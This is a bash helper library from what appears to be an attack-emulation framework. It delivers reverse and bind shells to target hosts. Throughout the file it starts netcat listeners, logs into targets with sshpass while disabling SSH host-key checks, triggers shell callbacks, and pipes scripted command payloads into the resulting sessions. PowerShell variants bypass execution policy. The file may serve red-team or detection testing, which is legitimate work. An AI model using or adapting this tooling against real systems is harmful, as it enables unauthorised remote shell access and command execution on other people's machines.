#!/usr/bin/env bash
# Shell delivery helpers for reverse/bind shell modes.
#
# Assumptions:
#   - Used from run_attack.sh after delivery config has been sourced.
#   - Delivery config defines TYPE, CONTROLLER, AUTOMATED, and optionally:
#       LHOST
#       LPORT
#       LISTENER_SCRIPT
#       CLIENT_SCRIPT
#       LISTENER_START_DELAY
#       SHELL_CONNECT_DELAY
#       POWERSHELL_EXE
#
# Notes:
#   - These helpers are intentionally conservative. They support automated bash/nc
#     workflows directly.
#   - PowerShell/ncat workflows are supported by launching .ps1 helpers, but manual
#     variants intentionally leave control to the operator.

set -euo pipefail

if ! declare -F error >/dev/null 2>&1; then
    # shellcheck disable=SC1091
    source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/log_utils.sh"
fi

require_file() {
    local path="$1"

    [[ -f "$path" ]] || {
        error "Missing required file: $path"
        return 1
    }
}

require_command() {
    local command_name="$1"

    command -v "$command_name" >/dev/null 2>&1 || {
        error "Missing required command: $command_name"
        return 1
    }
}

resolve_windows_path() {
    local path="$1"

    if command -v wslpath >/dev/null 2>&1; then
        wslpath -w "$path"
    else
        echo "$path"
    fi
}

ps_single_quote() {
    local value="$1"
    value="${value//\'/\'\'}"
    printf "'%s'" "$value"
}

shell_delivery_ssh() {
    local target="$1"
    local command="$2"

    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
        sshpass -p "$PASSWORD" \
            ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o LogLevel=ERROR \
            "$USERNAME@${target#*@}" \
            "$command"
    else
        ssh "$target" "$command"
    fi
}

start_powershell_script_background() {
    local script_path="$1"
    local launch_mode="${2:-background}"
    local powershell_exe="${POWERSHELL_EXE:-powershell.exe}"

    require_file "$script_path"

    local script_for_powershell
    script_for_powershell="$(resolve_windows_path "$script_path")"

    log "Starting PowerShell script: $script_path"

    local ps_target_host
    local ps_lport
    local ps_automated
    local ps_commands_file
    local ps_transcript_file
    local ps_script
    local ps_run_id

    ps_run_id="$(ps_single_quote "${RUN_ID:-}")"
    ps_target_host="$(ps_single_quote "${TARGET_HOST:-}")"
    ps_lport="$(ps_single_quote "${LPORT:-}")"
    ps_automated="$(ps_single_quote "${AUTOMATED:-false}")"
    ps_commands_file="$(ps_single_quote "$(resolve_windows_path "${COMMANDS_FILE:-}")")"
    ps_transcript_file="$(ps_single_quote "$(resolve_windows_path "${TRANSCRIPT_FILE:-}")")"
    ps_script="$(ps_single_quote "$script_for_powershell")"

    local ps_command
    ps_command="\$env:RUN_ID=$ps_run_id; \$env:TARGET_HOST=$ps_target_host; \$env:LPORT=$ps_lport; \$env:AUTOMATED=$ps_automated; \$env:COMMANDS_FILE=$ps_commands_file; \$env:TRANSCRIPT_FILE=$ps_transcript_file; & $ps_script"

    case "$launch_mode" in
    detached)
        # Open a separate Windows console window and return immediately.
        # This is intended for manual reverse-shell sessions where the
        # operator should interact with the ncat console directly.
        cmd.exe /c start "" "$powershell_exe" \
            -NoProfile \
            -ExecutionPolicy Bypass \
            -NoExit \
            -Command "$ps_command" >/dev/null 2>&1 &
        ;;

    background)
        "$powershell_exe" \
            -NoProfile \
            -ExecutionPolicy Bypass \
            -Command "$ps_command" &
        ;;

    *)
        error "Unknown PowerShell launch mode: $launch_mode"
        return 1
        ;;
    esac
}
# Start the controller-side FIFO-backed nc listener used by automated reverse
# shell deliveries.
start_bash_reverse_listener() {
    local run_dir="$1"
    local lport="${LPORT:?LPORT must be set for bash reverse shell listener}"

    require_command nc

    local fifo="$run_dir/shell_in"
    local transcript="$run_dir/shell_transcript.log"

    rm -f "$fifo"
    mkfifo "$fifo"

    log "Starting bash/nc reverse-shell listener on port $lport"

    nc -lvnp "$lport" <"$fifo" | tee "$transcript" &
    echo "$!" >"$run_dir/listener.pid"
}

# Feed a scripted payload into a connected shell and terminate the session.
feed_commands_to_fifo() {
    local fifo="$1"
    local commands_file="$2"

    require_file "$commands_file"

    log "Feeding commands from $commands_file"

    {
        cat "$commands_file"
        echo
        echo "exit"
    } >"$fifo"
}

# Orchestrate reverse-shell delivery: start listener, trigger target callback,
# then feed automated commands or hand control to the operator.
run_reverse_shell() {
    local target="$1"
    local run_id="$2"
    local run_dir="$3"
    local delivery_conf="$4"
    local payload_script="$5"

    # shellcheck disable=SC1090
    source "$delivery_conf"

    require_file "$payload_script"

    local controller="${CONTROLLER:?reverse_shell delivery requires CONTROLLER}"
    local automated="${AUTOMATED:-true}"
    local lhost="${LHOST:?reverse_shell delivery requires LHOST}"
    local lport="${LPORT:?reverse_shell delivery requires LPORT}"
    local listener_start_delay="${LISTENER_START_DELAY:-2}"
    local shell_connect_delay="${SHELL_CONNECT_DELAY:-3}"

    local commands_file="${COMMANDS_FILE:-}"

    if [[ -z "$commands_file" || "$commands_file" == "commands.txt" ]]; then
        commands_file="$payload_script"
    fi

    case "$controller" in
    bash)

        local fifo="$run_dir/shell_in"
        start_bash_reverse_listener "$run_dir"

        sleep "$listener_start_delay"

        log "Triggering reverse shell on target"

        if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
            shell_delivery_ssh "$target" \
                "RUN_ID='$run_id' \
            LHOST='$lhost' \
            LPORT='$lport' \
            TARGET_USER='${TARGET_USER:-}' \
            USERNAME='${USERNAME:-}' \
            PASSWORD='${PASSWORD:-}' \
            bash -s" \
                <"$TRIGGER_SCRIPT" &
        else
            shell_delivery_ssh "$target" \
                "RUN_ID='$run_id' \
            LHOST='$lhost' \
            LPORT='$lport' \
            TARGET_USER='${TARGET_USER:-}' \
            USERNAME='${USERNAME:-}' \
            PASSWORD='${PASSWORD:-}' \
            bash -lc '$TRIGGER_COMMAND'" &
        fi

        echo "$!" >"$run_dir/trigger.pid"

        sleep "$shell_connect_delay"

        if ! grep -q "Connection received" "$run_dir/shell_transcript.log" 2>/dev/null; then
            warn "Reverse shell did not connect before command feed"
            warn "Check LHOST in reverse_shell/bash_auto.conf"
            warn "Current LHOST: $lhost"
            warn "Current LPORT: $lport"
        fi

        if [[ "$automated" == "true" ]]; then
            feed_commands_to_fifo "$fifo" "$commands_file"
            timeout "${REVERSE_SHELL_TIMEOUT:-30}" tail --pid="$(cat "$run_dir/listener.pid")" -f /dev/null || true
            kill "$(cat "$run_dir/listener.pid")" >/dev/null 2>&1 || true
        else
            warn "Manual reverse shell mode active."
            warn "Listener is running. Interact manually, then close the shell."
            wait "$(cat "$run_dir/listener.pid")" || true
        fi
        ;;

    powershell)

        local listener_script="${LISTENER_SCRIPT:?PowerShell reverse shell requires LISTENER_SCRIPT}"

        if [[ "$listener_script" != /* ]]; then
            listener_script="$(dirname "$delivery_conf")/$listener_script"
        fi

        export RUN_ID="$run_id"
        export LHOST="0.0.0.0"
        export LPORT="$lport"
        export AUTOMATED="$automated"
        export COMMANDS_FILE="$commands_file"
        export TRANSCRIPT_FILE="C:/Windows/Temp/aegis_reverse_transcript_${run_id}.log"

        if [[ "$automated" == "true" ]]; then
            start_powershell_script_background "$listener_script" "background"
            echo "$!" >"$run_dir/listener.pid"
        else
            start_powershell_script_background "$listener_script" "detached"
            echo "$!" >"$run_dir/listener.pid"
        fi

        sleep "$listener_start_delay"

        log "Triggering reverse shell on target"

        if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
            shell_delivery_ssh "$target" \
                "RUN_ID='$run_id' \
                LHOST='$lhost' \
                LPORT='$lport' \
                TARGET_USER='${TARGET_USER:-}' \
                USERNAME='${USERNAME:-}' \
                PASSWORD='${PASSWORD:-}' \
                bash -s" \
                <"$TRIGGER_SCRIPT" &
        else
            shell_delivery_ssh "$target" \
                "RUN_ID='$run_id' \
                LHOST='$lhost' \
                LPORT='$lport' \
                TARGET_USER='${TARGET_USER:-}' \
                USERNAME='${USERNAME:-}' \
                PASSWORD='${PASSWORD:-}' \
                bash -lc \"$TRIGGER_COMMAND\"" &
        fi

        echo "$!" >"$run_dir/trigger.pid"

        sleep "$shell_connect_delay"

        if [[ "$automated" == "true" ]]; then
            timeout "${REVERSE_SHELL_TIMEOUT:-30}" tail --pid="$(cat "$run_dir/listener.pid")" -f /dev/null || true
            kill "$(cat "$run_dir/listener.pid")" >/dev/null 2>&1 || true

            powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \
                "Copy-Item -Force 'C:/Windows/Temp/aegis_reverse_transcript_${run_id}.log' '$(wslpath -w "$run_dir/shell_transcript.log")'" \
                >/dev/null 2>&1 || true
        else
            warn "Manual PowerShell reverse shell mode active."
            warn "Listener is running in a detached Windows PowerShell window."
            warn "Interact with the ncat window/session manually."
            warn "Close that window or type exit in the shell when finished."
        fi
        ;;

    *)
        error "Unsupported reverse shell CONTROLLER: $controller"
        return 1
        ;;
    esac
}

# Orchestrate bind-shell delivery: trigger target listener, connect back from
# the controller, and optionally feed scripted commands.
run_bind_shell() {
    local target="$1"
    local run_id="$2"
    local run_dir="$3"
    local delivery_conf="$4"
    local payload_script="$5"

    # shellcheck disable=SC1090
    source "$delivery_conf"

    require_file "$payload_script"

    local controller="${CONTROLLER:?bind_shell delivery requires CONTROLLER}"
    local automated="${AUTOMATED:-true}"
    local lport="${LPORT:?bind_shell delivery requires LPORT}"

    local shell_connect_delay="${SHELL_CONNECT_DELAY:-3}"
    local commands_file="${COMMANDS_FILE:-}"

    if [[ -z "$commands_file" || "$commands_file" == "commands.txt" ]]; then
        commands_file="$payload_script"
    fi

    log "Starting bind shell on target"

    TRIGGER_LOG="$run_dir/bind_trigger.log"

    if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
        shell_delivery_ssh "$target" \
            "RUN_ID='$run_id' \
            LPORT='$lport' \
            TARGET_USER='${TARGET_USER:-}' \
            USERNAME='${USERNAME:-}' \
            PASSWORD='${PASSWORD:-}' \
            bash -s" \
            <"$TRIGGER_SCRIPT" \
            >"$TRIGGER_LOG" 2>&1 &
    else
        shell_delivery_ssh "$target" \
            "RUN_ID='$run_id' \
            LPORT='$lport' \
            TARGET_USER='${TARGET_USER:-}' \
            USERNAME='${USERNAME:-}' \
            PASSWORD='${PASSWORD:-}' \
            bash -lc '$TRIGGER_COMMAND'" \
            >"$TRIGGER_LOG" 2>&1 &
    fi

    echo "$!" >"$run_dir/trigger.pid"

    sleep "${SHELL_CONNECT_DELAY:-5}"

    case "$controller" in
    bash)

        require_command nc

        if [[ "$automated" == "true" ]]; then
            log "Connecting to bind shell with nc"

            # If TARGET_HOST is set, prefer it. Otherwise strip user@ from target.
            local host="${TARGET_HOST:-${target#*@}}"
            local transcript="$run_dir/shell_transcript.log"
            local success_marker="__AEGIS_PAYLOAD_EXIT_CODE:0"

            if ! {
                cat "$commands_file"
                echo
                echo 'echo "__AEGIS_PAYLOAD_EXIT_CODE:$?"'
                echo "exit"
            } | timeout "${BIND_SHELL_TIMEOUT:-30}" nc "$host" "$lport" |
                tee "$transcript"; then
                error "Bind-shell command stream failed"
                return 1
            fi

            if ! grep -q "$success_marker" "$transcript"; then
                error "Bind-shell payload did not complete successfully"
                warn "Check transcript: $transcript"
                return 1
            fi
        else
            warn "Manual bind shell mode active."
            warn "Opening detached ncat client window."

            local host="${TARGET_HOST:-${target#*@}}"

            sleep "${SHELL_CONNECT_DELAY:-3}"

            cmd.exe /c start "" powershell.exe \
                -NoExit \
                -Command "Write-Host '[+] Connecting to bind shell: ${host}:${lport}'; & 'C:\Program Files (x86)\Nmap\ncat.exe' --crlf $host $lport; Write-Host '[!] ncat exited. Press Enter to close.'; Read-Host" \
                >/dev/null 2>&1 &
        fi
        ;;

    powershell)

        local client_script="${CLIENT_SCRIPT:?PowerShell bind shell requires CLIENT_SCRIPT}"

        if [[ "$client_script" != /* ]]; then
            client_script="$(dirname "$delivery_conf")/$client_script"
        fi

        local host="${TARGET_HOST:-${target#*@}}"

        export TARGET_HOST="$host"
        export LPORT="$lport"
        export AUTOMATED="$automated"

        local commands_file="${COMMANDS_FILE:-}"

        if [[ -z "$commands_file" || "$commands_file" == "commands.txt" ]]; then
            commands_file="$payload_script"
        fi

        export COMMANDS_FILE="$commands_file"
        export TRANSCRIPT_FILE="C:/Windows/Temp/aegis_shell_transcript_${run_id}.log"

        start_powershell_script_background "$client_script"
        echo "$!" >"$run_dir/client.pid"

        if [[ "$automated" == "true" ]]; then
            warn "PowerShell automated command feeding depends on client.ps1 implementation."
            warn "Payload script available for client automation: $payload_script"
            wait "$(cat "$run_dir/client.pid")" || true

            powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \
                "Copy-Item -Force 'C:/Windows/Temp/aegis_shell_transcript_${run_id}.log' '$(wslpath -w "$run_dir/shell_transcript.log")'" \
                >/dev/null 2>&1 || true
        else
            warn "Manual PowerShell bind shell mode active."
            warn "Interact with the ncat window/session manually."
            wait "$(cat "$run_dir/client.pid")" || true

            powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \
                "Copy-Item -Force 'C:/Windows/Temp/aegis_shell_transcript_${run_id}.log' '$(wslpath -w "$run_dir/shell_transcript.log")'" \
                >/dev/null 2>&1 || true
        fi
        ;;

    *)
        error "Unsupported bind shell CONTROLLER: $controller"
        return 1
        ;;
    esac
}
